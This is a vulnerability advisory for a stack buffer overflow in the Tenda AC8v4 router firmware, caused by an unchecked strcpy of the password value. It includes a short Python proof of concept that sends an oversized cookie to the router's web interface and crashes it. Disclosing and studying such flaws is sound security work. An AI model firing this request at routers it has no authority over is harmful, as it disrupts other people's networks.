## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-3683.html

## Affected version

AC8v4 V16.03.34.09

## Vulnerability details

The Tenda AC8v4 V16.03.34.09 firmware has a stack overflow vulnerability in the `R7WebsSecurityHandler` function. The `src` variable receives the `password` parameter from a POST request and is later assigned to the `v19` variable, which is fixed at 128 bytes. However, since the user can control the input of `password`, the statement `strcpy(v19, src);` can cause a buffer overflow. The user-provided  `password` can exceed the capacity of the `v19` array, triggering this security vulnerability.

![image-20240319133933045](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319133933045.png)

![image-20240319133855725](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319133855725.png)

## POC

```python
import requests

ip = "192.168.84.101"
url = "http://%s/goform/execCommand"%ip
cookie = {"Cookie":"password=" + "A"*1000}
ret = requests.get(url=url,cookies=cookie)
print(ret.text)
```

![image-20240415125733742](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240415125733742.png)